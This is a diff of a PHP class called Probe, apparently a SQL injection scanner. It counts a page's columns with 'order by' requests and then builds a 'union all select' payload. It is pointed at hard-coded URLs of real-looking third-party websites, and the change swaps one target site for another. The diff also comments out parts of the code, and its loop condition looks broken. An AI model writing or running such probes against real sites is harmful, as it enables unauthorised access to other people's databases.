@@ -37,17 +37,19 @@ class Probe
  	 * @param string $url
  	 * @return string
  	 */
+	/*
 	public function getColumnNum()
 	{
 		$column = 1;
-		if (true)
+		do
 		{
 			$orderUrl = $this->url . " order by " . $column;
 
 			$column++;
 
 			$contents = file_get_contents($orderUrl);
-		}	
+		}
+		while ($contents != substr('clause', 0));
 
 		$getRange = implode (",", range(1, $column - 1));
 
@@ -55,7 +57,7 @@ class Probe
 
 		return $shortUrl . "null union all select " . $getRange . "--";
 	}
-
+*/
 	/**
  	 * Returns column number that is most vulnerable to injection 
  	 *
@@ -80,13 +82,14 @@ class Probe
 	}
 }
 
-$probe = new Probe("http://www.bible-history.com/subcat.php?id=22");
-
+$probe = new Probe("http://www.slavsandtatars.com/about.php?id=25");
+/*
 $testError = $probe->getError();
 
 $testColumn = $probe->getColumnNum();
 
 $testVulnerable = $probe->getVulnerable();
 
-var_dump($testVulnerable);
+//var_dump($testColumn);
+*/
 ?>
